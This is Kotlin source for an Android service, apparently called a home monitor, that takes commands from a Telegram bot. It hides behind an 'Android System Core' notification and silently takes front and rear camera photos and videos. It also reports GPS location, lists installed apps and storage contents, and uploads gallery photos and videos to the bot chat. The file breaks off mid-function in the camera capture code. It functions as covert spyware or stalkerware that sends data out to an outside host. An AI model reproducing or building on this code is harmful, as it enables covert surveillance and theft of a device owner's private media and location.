package com.homemonitor

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.graphics.SurfaceTexture
import android.hardware.camera2.*
import android.location.Location
import android.location.LocationManager
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.Ringtone
import android.media.RingtoneManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.IBinder
import android.os.Handler
import android.os.HandlerThread
import android.os.BatteryManager
import android.os.Vibrator
import android.os.VibratorManager
import android.os.VibrationEffect
import android.provider.MediaStore
import android.util.Log
import android.view.Surface
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL
import org.json.JSONArray
import org.json.JSONObject
import java.io.FileInputStream
import java.io.OutputStream
import java.text.SimpleDateFormat
import java.util.*

class MonitorService : Service() {

    private val serviceJob = SupervisorJob()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    private var lastUpdateId = 0L
    private var pollingJob: Job? = null
    
    private val botToken: String
        get() = Config.BOT_TOKEN
    private val allowedChatId: String
        get() = Config.ALLOWED_CHAT_ID

    private val devCredit = "\n\n━━━━━━━━━━━━━━━━━━\n👨‍💻 Dev: [@developerxalamin007](https://t.me/developerxalamin007)"

    private var cameraHandler: Handler? = null
    private var cameraHandlerThread: HandlerThread? = null
    private var activeRingtone: Ringtone? = null

    companion object {
        const val TAG = "MonitorServiceTag"
        const val CHANNEL_ID = "HomeMonitorChannel"
        const val NOTIF_ID = 1
    }

    override fun onCreate() {
        super.onCreate()
        Config.init(applicationContext)
        createNotificationChannel()
        val notification = createPersistentNotification("System Monitoring Active")
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            } else {
                0
            }
            if (type != 0) {
                startForeground(NOTIF_ID, notification, type)
            } else {
                startForeground(NOTIF_ID, notification)
            }
        } else {
            startForeground(NOTIF_ID, notification)
        }
        
        cameraHandlerThread = HandlerThread("CameraBackgroundThread").apply {
            start()
            cameraHandler = Handler(looper)
        }
        Log.d(TAG, "Service Created & Config Initialized.")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "onStartCommand called, starting telegram polling...")
        startTelegramPolling()
        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Android System Core",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun createPersistentNotification(text: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Android Service")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setOngoing(true)
            .build()
    }

    private fun startTelegramPolling() {
        if (pollingJob?.isActive == true) return

        pollingJob = serviceScope.launch {
            Log.d(TAG, "Telegram polling coroutine started.")
            while (isActive) {
                try {
                    val token = botToken
                    if (token.isEmpty()) {
                        Log.e(TAG, "Bot Token is empty! Check app_config.json")
                        delay(5000)
                        continue
                    }

                    val urlString = "https://api.telegram.org/bot$token/getUpdates?offset=${lastUpdateId + 1}&timeout=10"
                    val url = URL(urlString)
                    val connection = (url.openConnection() as HttpURLConnection).apply {
                        requestMethod = "GET"
                        connectTimeout = 10000
                        readTimeout = 12000
                    }

                    val responseCode = connection.responseCode
                    if (responseCode == 200) {
                        val response = connection.inputStream.bufferedReader().use { it.readText() }
                        val jsonResponse = JSONObject(response)
                        val result = jsonResponse.getJSONArray("result")

                        for (i in 0 until result.length()) {
                            val update = result.getJSONObject(i)
                            lastUpdateId = update.getLong("update_id")

                            if (update.has("message")) {
                                val message = update.getJSONObject("message")
                                val chatId = message.getJSONObject("chat").getLong("id")
                                val text = message.optString("text", "")

                                Log.d(TAG, "Received message: '$text' from chatId: $chatId")

                                val currentChatIdStr = chatId.toString().trim()
                                val targetChatIdStr = allowedChatId.trim()

                                if (targetChatIdStr.isEmpty() || currentChatIdStr == targetChatIdStr) {
                                    handleCommand(chatId, text)
                                } else {
                                    Log.w(TAG, "Unauthorized access attempt from chatId: $currentChatIdStr")
                                    sendTelegramMessage(chatId, "⛔ Access Denied! Your Chat ID ($currentChatIdStr) is not authorized." + devCredit)
                                }
                            }
                        }
                    }
                    connection.disconnect()
                } catch (e: Exception) {
                    Log.e(TAG, "Polling exception: ${e.message}", e)
                }
                delay(1500)
            }
        }
    }

    private fun handleCommand(chatId: Long, command: String) {
        val cmd = command.lowercase().trim()
        Log.d(TAG, "Handling command: $cmd for chatId: $chatId")
        when {
            cmd == "/start" || cmd == "menu" -> {
                sendMenuWithActionButtons(chatId, "🎛 *CONTROL PANEL ACTIVE*")
            }
            cmd == "/help" -> {
                sendHelpMenu(chatId)
            }
            cmd == "/alive" -> {
                sendTelegramMessage(chatId, "🟢 *Device is online and running smoothly.*" + devCredit)
            }
            cmd == "/status" || cmd == "/devinfo" -> {
                val batteryStatus = batteryPercentage
                val deviceModel = android.os.Build.MODEL
                val manufacturer = android.os.Build.MANUFACTURER
                val androidVersion = android.os.Build.VERSION.RELEASE
                val sdkLevel = android.os.Build.VERSION.SDK_INT
                
                val appVersion = try {
                    val pInfo = packageManager.getPackageInfo(packageName, 0)
                    "${pInfo.versionName} (${pInfo.longVersionCode})"
                } catch (e: Exception) {
                    "1.0.0"
                }

                val currentTime = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())

                val infoMessage = "🎛 *SYSTEM STATUS & DEVICE INFO*\n\n" +
                        "📱 Device Model: `$deviceModel` ($manufacturer)\n" +
                        "⚙️ Android: `Android $androidVersion (API $sdkLevel)`\n" +
                        "🔋 Battery: `$batteryStatus%`\n" +
                        "📦 App Version: `$appVersion`\n" +
                        "🕒 Time: `$currentTime`\n" +
                        "🛡 Status: `✅ Active & Secure`" + devCredit

                sendTelegramMessage(chatId, infoMessage)
            }
            cmd == "/battery" -> {
                val batteryInfo = getDetailedBatteryInfo()
                sendTelegramMessage(chatId, batteryInfo + devCredit)
            }
            cmd == "/netinfo" -> {
                val netStatus = getNetworkInfo()
                sendTelegramMessage(chatId, "🌐 *NETWORK & CONNECTIVITY*\n\nStatus: `$netStatus`" + devCredit)
            }
            cmd.startsWith("/alert ") -> {
                val alertMsg = command.substringAfter("/alert ").trim()
                if (alertMsg.isNotEmpty()) {
                    showAlertNotification("System Alert", alertMsg)
                    sendTelegramMessage(chatId, "🔔 Alert notification displayed on device screen." + devCredit)
                } else {
                    sendTelegramMessage(chatId, "⚠️ Please provide a message. Example: `/alert Hello`" + devCredit)
                }
            }
            cmd == "/alarm" -> {
                playAlarm()
                sendTelegramMessage(chatId, "🚨 Alarm/Siren started playing at full volume." + devCredit)
            }
            cmd == "/alarmoff" -> {
                stopAlarm()
                sendTelegramMessage(chatId, "🛑 Alarm stopped." + devCredit)
            }
            cmd == "/camera" -> {
                sendTelegramMessage(chatId, "📸 Capturing rear camera photo..." + devCredit)
                capturePhoto(chatId, false)
            }
            cmd == "/frontcam" -> {
                sendTelegramMessage(chatId, "🤳 Capturing front camera photo..." + devCredit)
                capturePhoto(chatId, true)
            }
            cmd == "/video" -> {
                sendTelegramMessage(chatId, "🎥 Recording 10s silent rear video..." + devCredit)
                recordAndSendVideo(chatId, false)
            }
            cmd == "/frontvideo" -> {
                sendTelegramMessage(chatId, "📹 Recording 10s silent front video..." + devCredit)
                recordAndSendVideo(chatId, true)
            }
            cmd == "/sendvideo" || cmd == "/videos" || cmd == "/filevideo" -> {
                sendVideoCategoriesMenu(chatId)
            }
            cmd == "/location" -> {
                sendTelegramMessage(chatId, "📍 Fetching live device location..." + devCredit)
                fetchAndSendLocation(chatId)
            }
            cmd == "/apps" || cmd == "/applist" -> {
                sendTelegramMessage(chatId, "📱 Fetching user installed apps..." + devCredit)
                sendUserAppsList(chatId)
            }
            cmd == "/files" || cmd == "/filemn" -> {
                sendTelegramMessage(chatId, "📁 Scanning internal storage folders..." + devCredit)
                scanStorageAndMedia(chatId)
            }
            cmd == "/photos" || cmd == "/filephotos" -> {
                sendPhotoCategoriesMenu(chatId)
            }
            cmd == "/flashon" -> {
                sendTelegramMessage(chatId, "🔦 Flashlight turned ON." + devCredit)
                setFlashlight(true)
            }
            cmd == "/flashoff" -> {
                sendTelegramMessage(chatId, "🔦 Flashlight turned OFF." + devCredit)
                setFlashlight(false)
            }
            cmd == "/vibrate" -> {
                sendTelegramMessage(chatId, "📳 Vibrating device for 5 seconds..." + devCredit)
                triggerVibration()
            }
            else -> {
                sendTelegramMessage(chatId, "❓ Unknown command: `$command`\nSend /help to view available commands." + devCredit)
            }
        }
    }

    private fun sendMenuWithActionButtons(chatId: Long, text: String) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val keyboard = JSONArray().apply {
                    put(JSONArray().apply {
                        put(JSONObject().put("text", "/alive"))
                        put(JSONObject().put("text", "/status"))
                        put(JSONObject().put("text", "/battery"))
                        put(JSONObject().put("text", "/netinfo"))
                    })
                    put(JSONArray().apply {
                        put(JSONObject().put("text", "/alarm"))
                        put(JSONObject().put("text", "/alarmoff"))
                        put(JSONObject().put("text", "/location"))
                    })
                    put(JSONArray().apply {
                        put(JSONObject().put("text", "/camera"))
                        put(JSONObject().put("text", "/frontcam"))
                    })
                    put(JSONArray().apply {
                        put(JSONObject().put("text", "/video"))
                        put(JSONObject().put("text", "/frontvideo"))
                    })
                    put(JSONArray().apply {
                        put(JSONObject().put("text", "/photos"))
                        put(JSONObject().put("text", "/sendvideo"))
                    })
                    put(JSONArray().apply {
                        put(JSONObject().put("text", "/flashon"))
                        put(JSONObject().put("text", "/flashoff"))
                        put(JSONObject().put("text", "/vibrate"))
                    })
                    put(JSONArray().apply {
                        put(JSONObject().put("text", "/files"))
                        put(JSONObject().put("text", "/apps"))
                        put(JSONObject().put("text", "/help"))
                    })
                }

                val replyMarkup = JSONObject().apply {
                    put("keyboard", keyboard)
                    put("resize_keyboard", true)
                }

                val payload = JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", "$text$devCredit")
                    put("parse_mode", "Markdown")
                    put("reply_markup", replyMarkup)
                }

                sendPostRequest("https://api.telegram.org/bot$botToken/sendMessage", payload)
            } catch (e: Exception) {
                Log.e(TAG, "Error sending menu: ${e.message}", e)
            }
        }
    }

    private fun sendHelpMenu(chatId: Long) {
        val helpMessage = "📖 *SYSTEM CONTROL COMMANDS*\n\n" +
                "⚙️ *System & Status:*\n" +
                "├ /start - Show dynamic action panel\n" +
                "├ /alive - Check if device is active\n" +
                "├ /status - Device info & battery\n" +
                "├ /battery - Detailed battery diagnostics\n" +
                "├ /netinfo - Network & connection status\n" +
                "├ /location - Get current GPS location\n" +
                "└ /apps - List installed applications\n\n" +
                "🚨 *Alerts & Siren:*\n" +
                "├ /alarm - Play alarm/siren sound\n" +
                "├ /alarmoff - Stop alarm\n" +
                "└ /alert <text> - Show screen notification alert\n\n" +
                "📸 *Camera & Media:*\n" +
                "├ /camera / /frontcam - Photos\n" +
                "├ /video / /frontvideo - Silent videos\n" +
                "├ /photos - Browse photo folders\n" +
                "└ /sendvideo - Browse video folders\n\n" +
                "📂 *Storage & Hardware:*\n" +
                "├ /files - Explore storage root\n" +
                "├ /flashon / /flashoff - Flashlight\n" +
                "└ /vibrate - Vibrate device" + devCredit

        sendTelegramMessage(chatId, helpMessage)
    }

    private fun getDetailedBatteryInfo(): String {
        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val pct = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        
        val batteryStatus: Intent? = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val temp = batteryStatus?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0)?.let { it / 10.0 } ?: 0.0
        val voltage = batteryStatus?.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0) ?: 0
        val healthCode = batteryStatus?.getIntExtra(BatteryManager.EXTRA_HEALTH, BatteryManager.BATTERY_HEALTH_UNKNOWN) ?: BatteryManager.BATTERY_HEALTH_UNKNOWN
        
        val healthStr = when (healthCode) {
            BatteryManager.BATTERY_HEALTH_GOOD -> "Good"
            BatteryManager.BATTERY_HEALTH_OVERHEAT -> "Overheat"
            BatteryManager.BATTERY_HEALTH_DEAD -> "Dead"
            BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "Over Voltage"
            BatteryManager.BATTERY_HEALTH_COLD -> "Cold"
            else -> "Unknown"
        }
        
        return "🔋 *BATTERY DIAGNOSTICS*\n\n" +
               "├ Level: `$pct%`\n" +
               "├ Temperature: `${temp}°C`\n" +
               "├ Voltage: `${voltage} mV`\n" +
               "└ Health: `$healthStr`"
    }

    private fun getNetworkInfo(): String {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val activeNetwork = cm.activeNetwork ?: return "Disconnected"
            val capabilities = cm.getNetworkCapabilities(activeNetwork) ?: return "Disconnected"
            
            return when {
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "Connected via Wi-Fi"
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Connected via Mobile Data"
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Connected via Ethernet"
                else -> "Connected (Unknown Transport)"
            }
        } else {
            @Suppress("DEPRECATION")
            val networkInfo = cm.activeNetworkInfo
            return if (networkInfo != null && networkInfo.isConnected) {
                networkInfo.typeName
            } else {
                "Disconnected"
            }
        }
    }

    private fun showAlertNotification(title: String, message: String) {
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val alertChannelId = "HomeMonitorAlertChannel"

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                alertChannelId,
                "System Alerts",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "High priority system alert notifications"
            }
            notificationManager.createNotificationChannel(channel)
        }

        val alertNotification = NotificationCompat.Builder(this, alertChannelId)
            .setContentTitle(title)
            .setContentText(message)
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setDefaults(Notification.DEFAULT_ALL)
            .setAutoCancel(true)
            .build()

        notificationManager.notify(System.currentTimeMillis().toInt(), alertNotification)
    }

    private fun playAlarm() {
        try {
            val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
            activeRingtone = RingtoneManager.getRingtone(applicationContext, alarmUri)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                activeRingtone?.isLooping = true
            }
            activeRingtone?.play()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun stopAlarm() {
        try {
            activeRingtone?.stop()
        } catch (e: Exception) {}
    }

    private fun setFlashlight(turnOn: Boolean) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val cameraId = cameraManager.cameraIdList[0]
                cameraManager.setTorchMode(cameraId, turnOn)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun triggerVibration() {
        serviceScope.launch(Dispatchers.IO) {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    val vibratorManager = getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
                    val vibrator = vibratorManager.defaultVibrator
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        vibrator.vibrate(VibrationEffect.createOneShot(5000, VibrationEffect.DEFAULT_AMPLITUDE))
                    } else {
                        @Suppress("DEPRECATION")
                        vibrator.vibrate(5000)
                    }
                } else {
                    @Suppress("DEPRECATION")
                    val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        vibrator.vibrate(VibrationEffect.createOneShot(5000, VibrationEffect.DEFAULT_AMPLITUDE))
                    } else {
                        @Suppress("DEPRECATION")
                        vibrator.vibrate(5000)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Vibration error: ${e.message}", e)
            }
        }
    }

    private val batteryPercentage: Int
        get() {
            val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        }

    private fun sendPhotoCategoriesMenu(chatId: Long) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val foldersMap = mutableMapOf<String, Int>()
                val projection = arrayOf(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
                
                contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection, null, null,
                    MediaStore.Images.Media.DATE_ADDED + " DESC"
                )?.use { cursor ->
                    val bucketIdx = cursor.getColumnIndex(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
                    if (bucketIdx != -1) {
                        while (cursor.moveToNext()) {
                            val bucket = cursor.getString(bucketIdx) ?: "Unknown"
                            foldersMap[bucket] = (foldersMap[bucket] ?: 0) + 1
                        }
                    }
                }

                if (foldersMap.isEmpty()) {
                    sendTelegramMessage(chatId, "⚠️ No photo folders found on device." + devCredit)
                    return@launch
                }

                val keyboard = JSONArray()
                var currentRow = JSONArray()

                for ((folderName, count) in foldersMap) {
                    val buttonText = "📁 $folderName ($count)"
                    val callbackData = "photo_$folderName"
                    val button = JSONObject().put("text", buttonText).put("callback_data", callbackData)
                    
                    currentRow.put(button)
                    if (currentRow.length() == 2) {
                        keyboard.put(currentRow)
                        currentRow = JSONArray()
                    }
                }
                if (currentRow.length() > 0) {
                    keyboard.put(currentRow)
                }

                val replyMarkup = JSONObject().put("inline_keyboard", keyboard)
                val payload = JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", "📁 *Select a photo folder to browse:*" + devCredit)
                    put("parse_mode", "Markdown")
                    put("reply_markup", replyMarkup)
                }

                sendPostRequest("https://api.telegram.org/bot$botToken/sendMessage", payload)
            } catch (e: Exception) {
                Log.e(TAG, "Error in photo folders: ${e.message}", e)
            }
        }
    }

    private fun sendPhotosFromFolder(chatId: Long, folderName: String) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val photoProjection = arrayOf(
                    MediaStore.Images.Media.DATA,
                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME
                )

                val cursor = contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    photoProjection, null, null,
                    MediaStore.Images.Media.DATE_ADDED + " DESC"
                )

                var sentCount = 0
                cursor?.use {
                    val dataIdx = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                    val bucketIdx = it.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)

                    while (it.moveToNext() && sentCount < 10) {
                        val path = it.getString(dataIdx) ?: ""
                        val bucket = it.getString(bucketIdx) ?: ""

                        if (bucket.equals(folderName, true)) {
                            val file = File(path)
                            if (file.exists() && file.length() > 0) {
                                sendPhotoToTelegram(chatId, file)
                                sentCount++
                                delay(500)
                            }
                        }
                    }
                }

                if (sentCount == 0) {
                    sendTelegramMessage(chatId, "⚠️ No photos found in `$folderName` folder." + devCredit)
                } else {
                    sendTelegramMessage(chatId, "✅ Successfully sent $sentCount photos from `$folderName`!" + devCredit)
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error sending photos: ${e.message}", e)
            }
        }
    }

    private fun sendVideoCategoriesMenu(chatId: Long) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val foldersMap = mutableMapOf<String, Int>()
                val projection = arrayOf(MediaStore.Video.Media.BUCKET_DISPLAY_NAME)
                
                contentResolver.query(
                    MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                    projection, null, null,
                    MediaStore.Video.Media.DATE_ADDED + " DESC"
                )?.use { cursor ->
                    val bucketIdx = cursor.getColumnIndex(MediaStore.Video.Media.BUCKET_DISPLAY_NAME)
                    if (bucketIdx != -1) {
                        while (cursor.moveToNext()) {
                            val bucket = cursor.getString(bucketIdx) ?: "Unknown"
                            foldersMap[bucket] = (foldersMap[bucket] ?: 0) + 1
                        }
                    }
                }

                if (foldersMap.isEmpty()) {
                    sendTelegramMessage(chatId, "⚠️ No video folders found in internal storage." + devCredit)
                    return@launch
                }

                val keyboard = JSONArray()
                var currentRow = JSONArray()

                for ((folderName, count) in foldersMap) {
                    val buttonText = "🎥 $folderName ($count)"
                    val callbackData = "vfolder_$folderName"
                    val button = JSONObject().put("text", buttonText).put("callback_data", callbackData)
                    
                    currentRow.put(button)
                    if (currentRow.length() == 2) {
                        keyboard.put(currentRow)
                        currentRow = JSONArray()
                    }
                }
                if (currentRow.length() > 0) {
                    keyboard.put(currentRow)
                }

                val replyMarkup = JSONObject().put("inline_keyboard", keyboard)
                val payload = JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", "🎥 *Select a video folder from internal storage:*" + devCredit)
                    put("parse_mode", "Markdown")
                    put("reply_markup", replyMarkup)
                }

                sendPostRequest("https://api.telegram.org/bot$botToken/sendMessage", payload)
            } catch (e: Exception) {
                Log.e(TAG, "Error in video folders: ${e.message}", e)
            }
        }
    }

    private fun sendVideosFromFolder(chatId: Long, folderName: String) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val videoProjection = arrayOf(
                    MediaStore.Video.Media.DATA,
                    MediaStore.Video.Media.BUCKET_DISPLAY_NAME
                )

                val cursor = contentResolver.query(
                    MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                    videoProjection, null, null,
                    MediaStore.Video.Media.DATE_ADDED + " DESC"
                )

                var sentCount = 0
                cursor?.use {
                    val dataIdx = it.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)
                    val bucketIdx = it.getColumnIndexOrThrow(MediaStore.Video.Media.BUCKET_DISPLAY_NAME)

                    while (it.moveToNext() && sentCount < 5) {
                        val path = it.getString(dataIdx) ?: ""
                        val bucket = it.getString(bucketIdx) ?: ""

                        if (bucket.equals(folderName, true)) {
                            val file = File(path)
                            if (file.exists() && file.length() > 0) {
                                sendVideoToTelegram(chatId, file)
                                sentCount++
                                delay(1200)
                            }
                        }
                    }
                }

                if (sentCount == 0) {
                    sendTelegramMessage(chatId, "⚠️ No video files found in `$folderName` folder." + devCredit)
                } else {
                    sendTelegramMessage(chatId, "✅ Successfully sent $sentCount video(s) from `$folderName`!" + devCredit)
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error sending videos: ${e.message}", e)
            }
        }
    }

    private fun sendUserAppsList(chatId: Long) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val pm = packageManager
                val packages = pm.getInstalledPackages(0)
                val appDetails = mutableListOf<String>()

                for (pkg in packages) {
                    val appInfo = pkg.applicationInfo
                    if (appInfo != null) {
                        val isSystem = (appInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
                        if (!isSystem) {
                            val appName = appInfo.loadLabel(pm).toString()
                            val packageName = pkg.packageName
                            appDetails.add("$appName (`$packageName`)")
                        }
                    }
                }

                appDetails.sort()
                val appListStr = if (appDetails.isNotEmpty()) {
                    appDetails.joinToString("\n├ 📱 ")
                } else {
                    "No user apps found"
                }

                val message = "📱 *USER INSTALLED APPS*\n\nTotal: `${appDetails.size}`\n\n├ 📱 $appListStr" + devCredit
                sendTelegramMessage(chatId, message)
            } catch (e: Exception) {
                Log.e(TAG, "Error fetching apps: ${e.message}", e)
            }
        }
    }

    private fun scanStorageAndMedia(chatId: Long) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val rootDir = android.os.Environment.getExternalStorageDirectory()
                
                val stat = android.os.StatFs(rootDir.path)
                val blockSize = stat.blockSizeLong
                val totalBytes = stat.blockCountLong * blockSize
                val freeBytes = stat.availableBlocksLong * blockSize
                val usedBytes = totalBytes - freeBytes

                val totalGB = String.format(Locale.US, "%.2f GB", totalBytes / (1024.0 * 1024.0 * 1024.0))
                val usedGB = String.format(Locale.US, "%.2f GB", usedBytes / (1024.0 * 1024.0 * 1024.0))
                val freeGB = String.format(Locale.US, "%.2f GB", freeBytes / (1024.0 * 1024.0 * 1024.0))

                val filesList = rootDir.listFiles()
                val folderDetails = StringBuilder()

                if (filesList != null && filesList.isNotEmpty()) {
                    val sortedList = filesList.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
                    
                    var itemIndex = 1
                    for (file in sortedList) {
                        if (itemIndex > 25) {
                            folderDetails.append("\n...and more items.")
                            break
                        }

                        val itemName = file.name
                        if (file.isDirectory) {
                            val childCount = file.listFiles()?.size ?: 0
                            val folderSizeMB = getFolderSizeInMB(file)
                            folderDetails.append("📁 `$itemName/` — *$folderSizeMB MB* ($childCount items)\n")
                        } else {
                            val fileSizeMB = String.format(Locale.US, "%.2f", file.length() / (1024.0 * 1024.0))
                            folderDetails.append("📄 `$itemName` — *$fileSizeMB MB*\n")
                        }
                        itemIndex++
                    }
                } else {
                    folderDetails.append("⚠️ Could not list internal storage files.")
                }

                val message = "💾 *INTERNAL STORAGE EXPLORER*\n\n" +
                        "📊 *Storage Capacity:*\n" +
                        "├ Total: `$totalGB` | Used: `$usedGB` | Free: `$freeGB`\n\n" +
                        "📂 *Root Directories & Files (`/sdcard/`):*\n" +
                        folderDetails.toString() + devCredit

                sendTelegramMessage(chatId, message)

            } catch (e: Exception) {
                Log.e(TAG, "Storage Explorer Error: ${e.message}", e)
            }
        }
    }

    private fun getFolderSizeInMB(dir: File): String {
        var bytes = 0L
        try {
            val files = dir.listFiles()
            if (files != null) {
                for (f in files) {
                    bytes += if (f.isDirectory) {
                        f.listFiles()?.sumOf { if (it.isFile) it.length() else 0L } ?: 0L
                    } else {
                        f.length()
                    }
                }
            }
        } catch (e: Exception) {
            bytes = 0L
        }
        return String.format(Locale.US, "%.2f", bytes / (1024.0 * 1024.0))
    }

    @SuppressLint("MissingPermission")
    private fun fetchAndSendLocation(chatId: Long) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
                
                var location: Location? = null
                val providers = locationManager.allProviders
                for (provider in providers) {
                    val loc = locationManager.getLastKnownLocation(provider)
                    if (loc != null) {
                        if (location == null || loc.time > location.time) {
                            location = loc
                        }
                    }
                }

                if (location != null) {
                    val lat = location.latitude
                    val lon = location.longitude
                    val mapsUrl = "https://maps.google.com/?q=$lat,$lon"
                    sendTelegramMessage(chatId, "📍 *LIVE / PASSIVE GPS LOCATION*\nLat: `$lat`\nLon: `$lon`\n[Google Maps]($mapsUrl)" + devCredit)
                } else {
                    sendTelegramMessage(chatId, "⚠️ Location unavailable. GPS is off and no cached passive location found." + devCredit)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Location error: ${e.message}", e)
            }
        }
    }

    @SuppressLint("MissingPermission")
    private fun capturePhoto(chatId: Long, isFrontCam: Boolean) {
        serviceScope.launch(Dispatchers.IO) {
            var cameraDevice: CameraDevice? = null
            var captureSession: CameraCaptureSession? = null
            var imageReader: ImageReader? = null

            try {
                val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
                var targetCameraId = cameraManager.cameraIdList[0]

                for (id in cameraManager.cameraIdList) {
                    val characteristics = cameraManager.getCameraCharacteristics(id)
                    val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                    if (isFrontCam && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        targetCameraId = id
                        break
                    } else if (!isFrontCam && facing == CameraCharacteristics.LENS_FACING_BACK) {
                        targetCameraId = id
                        break
                    }
                }

                imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2)
                val photoFile = File(cacheDir, "snapshot.jpg")
                val isCaptured = CompletableDeferred<Boolean>()

                imageReader.setOnImageAvailableListener({ reader ->
                    try {
                        val image = reader.acquireLatestImage()
                        if (image != null) {
                            val buffer = image.planes[0].buffer
                            val bytes = ByteArray(buffer.remaining())
                            buffer.get(bytes)
                            image.close()

                            FileOutputStream(photoFile).use { it.write(bytes) }
                            if (!isCaptured.isCompleted) isCaptured.complete(true)
                        }
                    } catch (e: Exception) {
                        if (!isCaptured.isCompleted) isCaptured.complete(false)
                    }
                }, cameraHandler)

                val openLatch = CompletableDeferred<Boolean>()
                cameraManager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        try {
                            val dummyTexture = SurfaceTexture(10)
                            dummyTexture.setDefaultBufferSize(640, 480)
                            val dummySurface = Surface(dummyTexture)
                            val imgSurface = imageReader.surface

                            val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                addTarget(imgSurface)
                                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                            }

                            camera.createCaptureSession(listOf(dummySurface, imgSurface), object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    captureSession = session
